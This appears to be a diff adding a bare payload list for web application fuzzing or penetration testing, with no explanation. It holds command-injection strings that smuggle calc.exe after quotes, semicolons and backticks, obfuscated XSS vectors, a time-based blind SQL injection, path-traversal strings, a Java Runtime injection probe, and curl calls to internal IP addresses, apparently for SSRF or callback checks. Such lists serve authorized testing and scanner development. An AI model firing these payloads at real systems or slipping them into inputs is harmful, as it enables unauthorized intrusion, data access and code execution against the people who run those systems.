@@ -1,0 +1,21 @@
+t";calc.exe
+window[['a'][0] + 'lert'](1337)
+window[[%27a%27][0]%252b%27lert%27](1337)
+0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z
+t/../../../../t.txt
+/../../../../t1.txt
+t\..\..\..\..\t.txt
+\..\..\..\..\t1.txt
+<img/src/oneror=alert(5)>
+test"/><a href="data:text/html,<script>alert(4)</script>">ada</a>
+"><Svg Only=1 OnLoad=confirm(document.domain)>
+test"/><a href="data:text/html,<img src=x onerror=alert(4)>">ada</a>
+http://172.24.158.126:8073
+http://172.24.153.93:8073
+curl http://172.24.158.126:8073
+curl http://172.24.153.93:8073
+test"+Runtime.getRuntime()+"test
+test;calc.exe;
+123;calc.exe
+%0at;`calc.exe`;
+%00%20;`calc.exe`
